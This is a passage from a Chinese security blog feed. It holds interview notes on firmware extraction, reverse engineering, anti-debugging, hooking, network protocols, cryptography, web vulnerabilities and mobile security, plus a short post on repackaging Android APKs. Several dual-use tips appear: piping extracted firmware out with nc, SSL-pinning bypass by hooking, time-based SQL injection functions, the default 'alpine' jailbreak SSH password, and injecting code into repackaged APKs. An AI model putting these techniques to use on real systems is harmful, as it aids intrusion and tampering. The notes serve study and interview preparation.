class="headerlink" title="网络获取"></a>网络获取</h5><p>官网或联系售后索取升级包<br>适用于官网提供下载智能设备固件的情况<br>有的厂家只能从代理和官方的售后提供固件</p><h5 id="在线升级-抓包获取下载地址"><a href="#在线升级-抓包获取下载地址" class="headerlink" title="在线升级, 抓包获取下载地址"></a>在线升级, 抓包获取下载地址</h5><p>wireshark配合热点抓设备升级的包<br>burpsuite抓APP请求设备升级的包<br>如果能够抓取到升级的数据包，可以根据命名规则猜测老固件下载地址；</p><h5 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h5><p>用硬件电路的调试串口和固件的bootloader获取固件<br>前提是能找到隐藏的UART<br>万用表识别、逻辑分析仪识别监听；<br>接口引线；<br>从硬件串口获取系统权限后,用tar、nc、dd、echo、vi等命令提取固件<br>前提是已获取shell权限（网络或串口）；</p><p>存在ifconfig、nc、tar（zip、dd）命令；</p><p>用法：</p><p>在串口命令模式下：<br>用tar打包固件，或用dd命令提取固件；<br>用ifconfig配置ip地址；用nc命令连接本地机器；<br>通过nc命令传送打包后的固件</p><h5 id="调试口"><a href="#调试口" class="headerlink" title="调试口"></a>调试口</h5><p>从硬件调试接口:JTAG&#x2F;SWD, 利用调试工具的任意地址读取功能<br>存在JTAG接口的设备，直接用Jlink连接读取</p><h5 id="读取flash"><a href="#读取flash" class="headerlink" title="读取flash"></a>读取flash</h5><p>拆Flash、Sd卡、TF卡、硬盘等,用编程器或对应设备读固件<br>想办法弄下Flash，用编程器读取固件内容，有本事的还可以焊回去。</p><p>如果是MCU单片机，可以使用JTAG或者ST-LINK读取固件 JTAG有一个工具叫JFLASH可以读取</p><p>RT809：可以自动识别flash类型，自动提取</p><p>Flashrom：GitHub - espressif&#x2F;esptool: Espressif SoC serial bootloader utility</p><h5 id="用逻辑分析仪监听flash-ram获取信息"><a href="#用逻辑分析仪监听flash-ram获取信息" class="headerlink" title="用逻辑分析仪监听flash,ram获取信息"></a>用逻辑分析仪监听flash,ram获取信息</h5><p>用逻辑分析仪配合对应的软件，监听SPI flash获取信息，并保存二进制文件；</p><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>逆向升级软件,软件内置解包和通讯算法<br>逆向破解上位机，烧录工具</p><p>对软件进行抓包分析</p><p>通过利用网页和通讯漏洞获取固件敏感信息<br>存在web功能</p><p>任意文件读取</p><p>命令执行等漏洞</p><h4 id="windows漏洞的命名"><a href="#windows漏洞的命名" class="headerlink" title="windows漏洞的命名"></a>windows漏洞的命名</h4><p>Windows系统漏洞微软的漏洞编号命名格式为：MS08067<br>MS Micosoft的缩写，固定格式；<br>08 表示年份，即2008年发布的漏洞；<br>067 表示顺序，即当年度发布的第67个漏洞。</p><h4 id="网络信息系统安全的三道防线"><a href="#网络信息系统安全的三道防线" class="headerlink" title="网络信息系统安全的三道防线"></a>网络信息系统安全的三道防线</h4><ol><li>系统自身没有漏洞</li><li>防病毒和IDS，入侵系统检测等等</li><li>数据库备份</li></ol><h4 id="c-stdcall"><a href="#c-stdcall" class="headerlink" title="c++ stdcall"></a>c++ stdcall</h4><p>函数参数从右向左入栈，被调用的函数负责清除栈内数据</p><h4 id="进程和线程共享堆-但线程有自己的栈"><a href="#进程和线程共享堆-但线程有自己的栈" class="headerlink" title="进程和线程共享堆 但线程有自己的栈"></a>进程和线程共享堆 但线程有自己的栈</h4><h4 id="永恒之蓝漏洞"><a href="#永恒之蓝漏洞" class="headerlink" title="永恒之蓝漏洞"></a>永恒之蓝漏洞</h4><p>利用了windows的SMB协议，可以攻击445端口获取主机最高权限</p><h4 id="反向连接后门"><a href="#反向连接后门" class="headerlink" title="反向连接后门"></a>反向连接后门</h4><p>由于有防火墙的原因，可能无法从外部连接到目标设备，此时可以利用漏洞，在攻击者的机器上开启一个监听端口，由目标设备主动连接至攻击者的机器，大部分的防火墙对传出的连接没有过多限制。</p><h4 id="ARP-Address-Resolution-Protocol-欺骗"><a href="#ARP-Address-Resolution-Protocol-欺骗" class="headerlink" title="ARP(Address Resolution Protocol)欺骗"></a>ARP(Address Resolution Protocol)欺骗</h4><p>在局域网&#x2F;以太网内，通过发送虚假的ARP数据包，导致设备发送的网络流量被重定向到任意的MAC地址，攻击者可以进行窃取，修改或者拒绝服务攻击。</p><h4 id="PE文件结构和ELF文件结构"><a href="#PE文件结构和ELF文件结构" class="headerlink" title="PE文件结构和ELF文件结构"></a>PE文件结构和ELF文件结构</h4><p>elf文件结构，链接视角，分成了不同的节区section，.text .data(已初始化的静态变量) .rodata（只读变量） .bss（未初始化的全局变量） .got .plt等等</p><p>装载视角，相同的读写执行权限的会被装载到同一个segment，但要进行页对齐。</p><p><img src="https://bbs.pediy.com/upload/attach/201911/540885_3ACMWPTB4ZNCF2F.png" alt="img"></p><h4 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h4><p>PE头部有PE指纹，表明这个文件是一个PE文件。</p><p>DOS部分，为了兼容以前的DOS系统。</p><p>PE文件头：PE文件头标志（“PE”）+标准PE头+扩展PE头（程序入口EntryPoint，代码区base，数据区base，内存镜像base）程序真正的入口点&#x3D;内存镜像base+程序入口Entrypoint</p><p>节表：这个节的名称，偏移，大小，属性等等</p><p>节：是一个容器，可以包含代码，数据等，有独立的内存权限</p><p>导入表（要使用的库函数的地址表），导出表（一般是dll可以有导出函数），重定位表（如果PE文件被装载到不是默认的base的时候，需要登记哪个地址是错误的，使用重定位表来进行调整）</p><h4 id="逆向用什么工具"><a href="#逆向用什么工具" class="headerlink" title="逆向用什么工具"></a>逆向用什么工具</h4><p>IDA，Android Studio，apktool</p><h4 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h4><p>change mode，只有文件的拥有者和su可以对文件进行权限变更，就是修改读&#x2F;写&#x2F;执行权限</p><p>所有者&#x2F;用户组&#x2F;其他用户</p><p>怎么提升为root用户-&gt;sudo（我怎么知道为什么问这个） </p><p>做过什么开发的工作（python写利用脚本，C写MFC的数字图像处理小工具）</p><h4 id="断点的区别"><a href="#断点的区别" class="headerlink" title="断点的区别"></a>断点的区别</h4><p>以x86指令为例</p><p>软件断点：会在下断点的指令处，将指令的第一个字节替换为0xCC（INT 3），再运行以后，又回把他们都换回去，软件断点没有数目限制</p><p>硬件断点：CPU提供了专门的调试寄存器，其中前四个是硬件断点寄存器，CPU执行到这里满足条件会自动停下来，但是缺点是只有四个。</p><h4 id="病毒的行为"><a href="#病毒的行为" class="headerlink" title="病毒的行为"></a>病毒的行为</h4><p>危害&#x2F;读写文件&#x2F;删除数据&#x2F;蠕虫病毒可以自我复制</p><h4 id="如何通过一段汇编获取当前代码的地址"><a href="#如何通过一段汇编获取当前代码的地址" class="headerlink" title="如何通过一段汇编获取当前代码的地址"></a>如何通过一段汇编获取当前代码的地址</h4><p>call指令会在栈上保存IP，然后pop就可以了</p><p>call addr</p><p>addr:</p><p>pop eax</p><p>ret</p><h4 id="反调试（只知道IsDebuggerPresent打扰了）"><a href="#反调试（只知道IsDebuggerPresent打扰了）" class="headerlink" title="反调试（只知道IsDebuggerPresent打扰了）"></a>反调试（只知道IsDebuggerPresent打扰了）</h4><p>windows调试器：</p><ol><li>windows API: <ol><li>isDebuggerPresent（进程PEB中的标志位） checkRemoteDebuggerPresent </li><li>getLastError（调试器不会立即将异常传给进程，所以可以自己抛出一个异常，如果没有接受到，那就是有debugger存在）</li></ol></li><li>系统检测<ol><li>查看调试器引用的注册表，如果对应的键被修改为od或者windbg等等，那么就可能被调试</li><li>查看当前窗口名称，匹配字符串</li><li>枚举进程信息</li></ol></li><li>断点检测<ol><li>软件断点：在缓冲区中搜索INT3</li><li>硬件断点：是不是四个硬件断点寄存器都是0</li><li>运行时间，如果被调试的话，运行时间会长很多</li><li>运行父进程：如果是双击打开的话，一般父进程为explore但如果不是，可能是调试器</li></ol></li></ol><h4 id="分析过什么恶意代码（wannacry）wannacry为什么这么大"><a href="#分析过什么恶意代码（wannacry）wannacry为什么这么大" class="headerlink" title="分析过什么恶意代码（wannacry）wannacry为什么这么大"></a>分析过什么恶意代码（wannacry）wannacry为什么这么大</h4><p>？？？</p><h4 id="IDA还原数据结构的原理，是IDA自己的原理"><a href="#IDA还原数据结构的原理，是IDA自己的原理" class="headerlink" title="IDA还原数据结构的原理，是IDA自己的原理"></a>IDA还原数据结构的原理，是IDA自己的原理</h4><h4 id="代码到文件的过程（4个）"><a href="#代码到文件的过程（4个）" class="headerlink" title="代码到文件的过程（4个）"></a>代码到文件的过程（4个）</h4><p>预编译（头文件插入），编译（词法分析&#x2F;语法分析，编译为汇编语言），汇编（汇编代码到机器码），链接（链接库）</p><h4 id="文件执行的过程"><a href="#文件执行的过程" class="headerlink" title="文件执行的过程"></a>文件执行的过程</h4><h4 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a>控制流平坦化</h4><p>代码本来是按照逻辑顺序执行的，平坦化指的是把代码的基本块拆分，把本来顺序执行的代码用switch case打乱分发，用一个变量来连接起来，是一种混淆的方法，可以增大被分析的难度。是一个编译选项。</p><h4 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h4><p>符号执行</p><h4 id="设计混淆方法"><a href="#设计混淆方法" class="headerlink" title="设计混淆方法"></a>设计混淆方法</h4><p>隐藏变量名&#x2F;函数名&#x2F;类名</p><h4 id="inlinehook"><a href="#inlinehook" class="headerlink" title="inlinehook"></a>inlinehook</h4><p>以x86指令为例，inline hook指的是修改原 本程序中的call指令，变成jmp指令跳转到我们的函数，然后我们在函数里面可以读取原本调用函数的参数等等，然后再跳转到原来的函数，最后返回到call的下一条指令。</p><p><a href="https://images.cnblogs.com/cnblogs_com/luoyesiqiu/1643996/o_200213062347inlinehook.png"><img src="https://images.cnblogs.com/cnblogs_com/luoyesiqiu/1643996/o_200213062347inlinehook.png" alt="img"></a></p><p>也可以对目标函数的前N个byte放到hook函数里</p><p>目标函数的前N个byte用来跳转到hook函数</p><p>hook函数末尾再跳转回目标函数+N的位置</p><p>最后要恢复堆栈平衡 保持和调用前的逻辑一致</p><h4 id="常见的hook机制"><a href="#常见的hook机制" class="headerlink" title="常见的hook机制"></a>常见的hook机制</h4><p>LD_PRELOAD hook</p><p>系统调用表 hook</p><p>GOT 表 hook</p><p>inline hook</p><h4 id="linux查看进程的命令"><a href="#linux查看进程的命令" class="headerlink" title="linux查看进程的命令"></a>linux查看进程的命令</h4><p>ps</p><p>ss：ss 是Socket Statistics 的缩写。 ss 命令<strong>可以用来获取socket 统计信息</strong>，它显示的内容和netstat 类似</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="逆向，分析程序的完整过程"><a href="#逆向，分析程序的完整过程" class="headerlink" title="逆向，分析程序的完整过程"></a>逆向，分析程序的完整过程</h4><p>获取固件，确定指令集&#x2F;装载base，确定危险函数</p><p>查找危险函数的引用，查找对输入的检查</p><h4 id="脱壳（压缩壳，加密壳区别）-IAT壳-脱壳，讲一下vmprotect（只听过这个名字打扰了）壳的原理"><a href="#脱壳（压缩壳，加密壳区别）-IAT壳-脱壳，讲一下vmprotect（只听过这个名字打扰了）壳的原理" class="headerlink" title="脱壳（压缩壳，加密壳区别） IAT壳  脱壳，讲一下vmprotect（只听过这个名字打扰了）壳的原理"></a>脱壳（压缩壳，加密壳区别） IAT壳  脱壳，讲一下vmprotect（只听过这个名字打扰了）壳的原理</h4><p>压缩壳主要是用来减少PE体积，保护内部的代码和资源，采用了数据压缩算法</p><p>加密壳，程序动态运行的时候把真正的逻辑解密出来，然后开始执行，防止程序被分析，调试，逆向。通常加密后的PE程序比原文件大的多。</p><p>IAT表，就是PE文件在调用dll中的函数的时候，会间接跳转，类似于elf中的got。</p><p>程序的壳一般是针对各个区块分别加密的，所以每次进入壳程序前，要保存当前的寄存器状态，壳执行完以后，再恢复。最后跳转到解密出来的原程序执行。执行之前，还要恢复IAT表，处理好重定位的东西。</p><p>找到OEP（Entry Point）以后，我们可以将程序dump出来，但是需要借助工具重建其IAT表，然后才能单独执行。</p><p>IAT壳：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">很多比较鸡贼的壳都会修改程序的IAT,这里说的修改不是指加壳以后的修改(加壳以后几乎所有的壳都会重建程序的IAT),而是指程序到达真正的OEP以后,发现IAT表中很多函数指到了别的地方,导致ImportRec无法修复.<br></code></pre></td></tr></table></figure><p>VMprotect</p><p>搞一个自己的引擎，维护一个虚拟的堆栈，PC指针等等，将原有的指令比如内存操作，算术运算等等转化成自定义的一些操作码，然后开始运行时有自己的引擎解释执行，增大的破解难度。</p><h4 id="静态和动态的区别"><a href="#静态和动态的区别" class="headerlink" title="静态和动态的区别"></a>静态和动态的区别</h4><p>静态的话主要是看程序的逻辑问题，动态的话主要是利用</p><h4 id="gdb，od，ida的区别"><a href="#gdb，od，ida的区别" class="headerlink" title="gdb，od，ida的区别"></a>gdb，od，ida的区别</h4><p>gdb是linux下的debugger，od是windows下的debugger，ida是反汇编&#x2F;反编译工具</p><h4 id="汇编怎么找代码对应的地址"><a href="#汇编怎么找代码对应的地址" class="headerlink" title="汇编怎么找代码对应的地址"></a>汇编怎么找代码对应的地址</h4><p>装载base+文件中的函数offset</p><h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><h4 id="linux端口占用的查询"><a href="#linux端口占用的查询" class="headerlink" title="linux端口占用的查询"></a>linux端口占用的查询</h4><ol><li><p><code>lsof -i:80</code></p></li><li><p><code>netstat -tunlp | grep 80</code></p></li></ol> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined">-t (tcp) 仅显示tcp相关选项<br>-u (udp)仅显示udp相关选项<br>-n 拒绝显示别名，能显示数字的全部转化为数字<br>-l 仅列出在Listen(监听)的服务状态<br>-p 显示建立相关链接的程序名       <br></code></pre></td></tr></table></figure><h4 id="NTP服务端口：UDP123"><a href="#NTP服务端口：UDP123" class="headerlink" title="NTP服务端口：UDP123"></a>NTP服务端口：UDP123</h4><h4 id="UDP和TCP报文方面的区别"><a href="#UDP和TCP报文方面的区别" class="headerlink" title="UDP和TCP报文方面的区别"></a>UDP和TCP报文方面的区别</h4><p>TCP的报文头部更长，UDP的比较短，因为TCP需要一些标志位来保证报文抵达，按顺序抵达，以及拥塞控制等等</p><h4 id="UDP和TCP有哪些区别"><a href="#UDP和TCP有哪些区别" class="headerlink" title="UDP和TCP有哪些区别"></a>UDP和TCP有哪些区别</h4><p>TCPUDP</p><p>面向连接的 无连接的&#x2F;不会对数据进行拆分，合并&#x2F;不用握手</p><p>消耗系统资源多消耗系统资源少</p><p>保证数据抵达&#x2F;重传  可能丢包&#x2F;发送方不知道是否丢包</p><p>保证数据顺序乱序</p><p>仅支持单播可以广播</p><p>全双工&#x2F;四次挥手不是全双工</p><p>最后一次握手是为了防止拥塞的连接请求后面又到了服务端，引起资源浪费</p><p>客户端发送完第四次挥手以后还会等一会，防止这个挥手报文丢失</p><h4 id="为什么UDP不如TCP安全"><a href="#为什么UDP不如TCP安全" class="headerlink" title="为什么UDP不如TCP安全"></a>为什么UDP不如TCP安全</h4><p>想要伪造一个UDP包很容易 甚至可以修改ip</p><p>想要伪造一个tcp包首先不能修改ip 除非是syn flood 其次中途有seq 不太好劫持</p><h4 id="TCP有什么漏洞（syn-flood攻击，TCP会话劫持攻击）"><a href="#TCP有什么漏洞（syn-flood攻击，TCP会话劫持攻击）" class="headerlink" title="TCP有什么漏洞（syn flood攻击，TCP会话劫持攻击）"></a>TCP有什么漏洞（syn flood攻击，TCP会话劫持攻击）</h4><p>syn flood</p><p>可以通过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sysctl -w net.ipv4.<span class="hljs-attribute">tcp_synvcookies</span>=1<br>表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭<br></code></pre></td></tr></table></figure><p>会话劫持</p><p>强制重传（降低效率）</p><h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p>通过公钥基础设施来协商一个共享的secret，用服务器的公钥加密，服务器自己的私钥解密，后续使用这个secret进行对称加密</p><h4 id="SSL-pinning"><a href="#SSL-pinning" class="headerlink" title="SSL pinning"></a>SSL pinning</h4><p>把服务器的证书打包放进客户端里面，从而使得中间人攻击失败。</p><p>破解方法就是要么在客户端找到这个证书并添加&#x2F;替换，要么hook最后校验的方法，让其返回true。</p><h4 id="DNS解析过程"><a href="#DNS解析过程" class="headerlink" title="DNS解析过程"></a>DNS解析过程</h4><p>DNS是基于UDP的应用层协议</p><h4 id="image-20220728111246564-x2F-Users-x2F-lihaoran-x2F-Library-x2F-Application-Support-x2F-typora-user-images-x2F-image-20220728111246564-png"><a href="#image-20220728111246564-x2F-Users-x2F-lihaoran-x2F-Library-x2F-Application-Support-x2F-typora-user-images-x2F-image-20220728111246564-png" class="headerlink" title="![image-20220728111246564](&#x2F;Users&#x2F;lihaoran&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220728111246564.png)"></a>![image-20220728111246564](&#x2F;Users&#x2F;lihaoran&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220728111246564.png)</h4><p><img src="https://images2015.cnblogs.com/blog/464291/201707/464291-20170703113844956-354755333.jpg" alt="img"></p><p>例如，如果查<a href="http://www.163.com/">www.163.com</a></p><p>顺序应该是先查hosts文件，然后查本地DNS服务器，如果均没有记录，本地DNS会查DNS根服务器，根服务器会告诉一个com域服务器，com域服务器会告诉163.com域服务器，163.com域服务器会返回ip地址，并缓存在本地DNS服务器中，最后发回给客户端。</p><p><strong>递归</strong>：客户端只发一次请求，要求对方给出最终结果。返回的结果只有两种：查询成功或查询失败。<br><strong>迭代</strong>：又称为“重指引”。客户端发出一次请求，对方如果没有<strong>授权回答</strong>（向dns服务器查询一个域名，刚好这个域名是本服务器负责，返回的结果就是授权回答），它就会返回一个能解答这个查询的其它名称服务器列表，客户端会再向返回的列表中发出请求，直到找到最终负责所查域名的名称服务器，从它得到最终结果。<br><strong>客户端-本地dns服务端</strong>：这部分属于<strong>递归</strong>查询。<br><strong>本地dns服务端-外网</strong>：这部分属于<strong>迭代</strong>查询。（不启用转发模式）</p><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="x2F-etc-x2F-shadow文件"><a href="#x2F-etc-x2F-shadow文件" class="headerlink" title="&#x2F;etc&#x2F;shadow文件"></a>&#x2F;etc&#x2F;shadow文件</h4><p>同 &#x2F;etc&#x2F;passwd 文件一样，文件中每行代表一个用户，同样使用 “:” 作为分隔符，不同之处在于，每行用户信息被划分为 9 个字段。每个字段的含义如下：</p><p>用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段 </p><p>这里保存的是真正加密的密码。目前 Linux 的密码采用的是 SHA512 散列加密算法，原来采用的是 MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高，也更加安全。</p><p>注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件透过这个功能，在密码串前加上 “!”、”*” 或 “x” 使密码暂时失效。 </p><p>所有伪用户的密码都是 “!!” 或 “*”，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 “!!”，代表这个用户没有密码，不能登录。</p><h4 id="x2F-etc-x2F-passwd文件"><a href="#x2F-etc-x2F-passwd文件" class="headerlink" title="&#x2F;etc&#x2F;passwd文件"></a>&#x2F;etc&#x2F;passwd文件</h4><p>其中第一个位置为用户名称，root权限并不取决于用户的名称叫root，而是第三个位置的用户ID为0。第二个位置是密码，如果是x，那么密码就被存放在&#x2F;etc&#x2F;shadow文件中。我们也可以直接把密码的哈希值直接放在这里，这样就不用再去修改shadow文件了</p><h4 id="密码学算法，对称非对称随便说几个"><a href="#密码学算法，对称非对称随便说几个" class="headerlink" title="密码学算法，对称非对称随便说几个"></a>密码学<a href="https://www.nowcoder.com/jump/super-jump/word?word=%E7%AE%97%E6%B3%95">算法</a>，对称非对称随便说几个</h4><p>非对称，RSA，DH</p><p>对称 AES DES 3DES</p><p>摘要 MD5 SHA1 SHA256</p><h4 id="常见的hash算法有哪些"><a href="#常见的hash算法有哪些" class="headerlink" title="常见的hash算法有哪些"></a>常见的hash<a href="">算法</a>有哪些</h4><p>（SHA256、SHA1，MD5） </p><h4 id="这些哈希算法的区别"><a href="#这些哈希算法的区别" class="headerlink" title="这些哈希算法的区别"></a>这些哈希<a href="">算法</a>的区别</h4><p>SHA1 产生160位 </p><p>SHA256 产生256位 </p><p>MD5 产生128位</p><h4 id="对称加密和非对称加密的区别，分别有哪些加密算法"><a href="#对称加密和非对称加密的区别，分别有哪些加密算法" class="headerlink" title="对称加密和非对称加密的区别，分别有哪些加密算法"></a>对称加密和非对称加密的区别，分别有哪些加密<a href="">算法</a></h4><p>对称加密：AES DES 3DES 加密和解密的时候使用一个公用的密钥，所以双方通信的时候需要提前共享这样一个密钥</p><p>非对称加密：RSA DH 有一对密钥 公钥加密，私钥解密，私钥加密，公钥解密</p><h3 id="一些关于AES和DES的问题（长度等）"><a href="#一些关于AES和DES的问题（长度等）" class="headerlink" title="一些关于AES和DES的问题（长度等）"></a>一些关于AES和DES的问题（长度等）</h3><p>AES运算速度快，内存占用低，分组&#x2F;密钥长度128，192，256</p><p>DES长度只能64，密钥比较短（64位）</p><h4 id="AES的子密钥如何生成"><a href="#AES的子密钥如何生成" class="headerlink" title="AES的子密钥如何生成"></a>AES的子密钥如何生成</h4><p>keyExpansion 密钥扩展算法</p><h4 id="了解MAC算法吗"><a href="#了解MAC算法吗" class="headerlink" title="了解MAC算法吗"></a>了解MAC<a href="">算法</a>吗</h4><p>就是在HASH的基础上又加入了密钥，保证中途原消息和摘要不被篡改</p><h4 id="加盐hash："><a href="#加盐hash：" class="headerlink" title="加盐hash："></a>加盐hash：</h4><p>在hash保存密码之前加一段随机的盐，也保存这个盐在数据库中</p><h4 id="数字签名："><a href="#数字签名：" class="headerlink" title="数字签名："></a>数字签名：</h4><p>A想要发给B一段消息，A先计算消息的摘要，然后用自己的私钥加密这个摘要，B接受到以后，用A的公钥揭开摘要，然后自己再算一遍摘要，看看能不能匹配，这样保证了消息是A发出的而不是别人</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="web有哪些常见漏洞"><a href="#web有哪些常见漏洞" class="headerlink" title="web有哪些常见漏洞"></a>web有哪些常见漏洞</h4><p>XSS，csrf，</p><h4 id="xss和csrf的区别"><a href="#xss和csrf的区别" class="headerlink" title="xss和csrf的区别"></a>xss和csrf的区别</h4><p>XSS是用户的输入被当作了返回的页面元素的一部分，被解释执行</p><p>CSRF是用户在B恶意网站跨域向A网站发送了一条请求，请求会带上cookie从而使攻击成功</p><h4 id="csrf如何防护"><a href="#csrf如何防护" class="headerlink" title="csrf如何防护"></a>csrf如何防护</h4><p>验证码，请求时要求与用户进行交互。</p><p>Referer，说明是从哪个页面发出来的</p><p>Secret token，提交的时候需要在服务器端验证这个token</p><h4 id="SQL有基于布尔的盲注和基于时间的盲注，还有基于报错的注入"><a href="#SQL有基于布尔的盲注和基于时间的盲注，还有基于报错的注入" class="headerlink" title="SQL有基于布尔的盲注和基于时间的盲注，还有基于报错的注入"></a>SQL有基于布尔的盲注和基于时间的盲注，还有基于报错的注入</h4><h4 id="sql延时注入常用函数"><a href="#sql延时注入常用函数" class="headerlink" title="sql延时注入常用函数"></a>sql延时注入常用函数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">1000</span>)</span></span> <br><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">(<span class="hljs-number">100000000</span>,md5(<span class="hljs-number">1</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>通过页面的反应时间来判断是否盲注成功</p><h4 id="被称为XSS终结者"><a href="#被称为XSS终结者" class="headerlink" title="被称为XSS终结者"></a>被称为XSS终结者</h4><p>CSP 内容安全策略 只有带有指定nonce的script代码块才可以被执行 &#x2F; 只有指定域名的远程js代码才可以被执行</p><h4 id="哪些是同源策略（协议、域名、端口均相同）"><a href="#哪些是同源策略（协议、域名、端口均相同）" class="headerlink" title="哪些是同源策略（协议、域名、端口均相同）"></a>哪些是同源策略（协议、域名、端口均相同）</h4><h4 id="PHP语言中的结构体"><a href="#PHP语言中的结构体" class="headerlink" title="PHP语言中的结构体"></a>PHP语言中的结构体</h4><p>eval</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>就是外部传入的XML文件 在被解析的时候由于没有合法的校验输入而导致 XML中一些恶意代码被执行</p><p>可以通过修改编码的方式绕过检测</p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>可以使用00截断，中间件解析漏洞，不常见但是可以被解析的后缀文件等等</p><p>一般不上传压缩文件</p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="全连接扫描和半开连接扫描的区别"><a href="#全连接扫描和半开连接扫描的区别" class="headerlink" title="全连接扫描和半开连接扫描的区别"></a>全连接扫描和半开连接扫描的区别</h4><p>全连接就是三次握手完成（准确&#x2F;容易被发现）</p><p>半连接就是只发送SYN（不会有日志记录&#x2F;不是很准确）</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>就是如果目标主机B不可达 我们可以通过web服务器作为一个代理 利用服务器上面的漏洞对目标内网进行攻击</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h4 id="什么是稳定排序？"><a href="#什么是稳定排序？" class="headerlink" title="什么是稳定排序？"></a>什么是稳定排序？</h4><h4 id="链表排序"><a href="#链表排序" class="headerlink" title="链表排序"></a>链表排序</h4><h4 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h4><h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><h3 id="Android-amp-amp-ios"><a href="#Android-amp-amp-ios" class="headerlink" title="Android &amp;&amp; ios"></a>Android &amp;&amp; ios</h3><h4 id="Xposed-框架"><a href="#Xposed-框架" class="headerlink" title="Xposed 框架"></a>Xposed 框架</h4><p>是一个android的hook框架，可以对任意app进行函数调用的拦截&#x2F;hook。原理：安卓系统启动以后会启动init进程，init进程会调用app_process文件来启动zygote进程，xposed通过替换app_process文件以及动态链接库，让zygote在启动app时注入框架代码，从而实现对程序app进程的劫持。</p><p>框架中有一些关键方法，例如findAndHookMethod，findAndHookConstructor，findClass，findField原理就是首先找到需要hook对象的方法的地址，然后在这个地址处加入了before和after方法，让原本函数的调用可以按照before-original-after来执行</p><h4 id="Android四大组件分别为"><a href="#Android四大组件分别为" class="headerlink" title="Android四大组件分别为"></a>Android四大组件分别为</h4><p>activity、service、content provider、broadcast receiver</p><h4 id="ios调试"><a href="#ios调试" class="headerlink" title="ios调试"></a>ios调试</h4><p>IDA，lldb，cycript可以调试，theos是用来开发越狱app的，不能用来调试ios应用</p><h4 id="iOS设备越狱后ssh连接的默认初始密码是"><a href="#iOS设备越狱后ssh连接的默认初始密码是" class="headerlink" title="iOS设备越狱后ssh连接的默认初始密码是"></a>iOS设备越狱后ssh连接的默认初始密码是</h4><p>alpine</p><h4 id="apk-V1-V2签名"><a href="#apk-V1-V2签名" class="headerlink" title="apk V1 V2签名"></a>apk V1 V2签名</h4>]]></content>
    
    
    
    <tags>
      
      <tag>interview experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mobileSec</title>
    <link href="/2022/07/23/mobileSec/"/>
    <url>/2022/07/23/mobileSec/</url>
    
    <content type="html"><![CDATA[<h3 id="重打包"><a href="#重打包" class="headerlink" title="重打包"></a>重打包</h3><p>安卓的重打包指的是对一个apk文件，我们可以对其进行拆分，反汇编从dex字节码得到可读的smali字节码。我们可以使用apktool完成这个任务。在拆分后的文件结构里，<code>original/META-INF</code> 文件中包含了用来保证APK完整性和系统安全的数据。<code>res</code> 目录下是一些资源文件。<code>smali</code> 目录下是库文件和smali代码。<code>AndroidManifest.xml</code> 包含了app的一些组件，名称，版本，权限等信息。</p><p>我们可以在 <code>smali</code> 目录下直接修改原有的逻辑，或者整体添加一个新的组件，比如一个 <code>BroadcastReceiver</code> 我们需要在 <code>AndroidManifest.xml</code> 中声明相对应的权限和注册一个接收器。当系统中发出一个Broadcast时，我们的函数就会被触发。</p><p>由于安卓需要允许程序员运行自己开发的App，所以可以使用自签名的证书来对apk进行签名，安装时系统也不会校验。</p>]]></content>
    
    
    
    <tags>
      
      <tag>mobile Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>systemSec</title>
    <link href="/2022/07/20/systemSec/"/>
    <url>/2022/07/20/systemSec/</url>
    
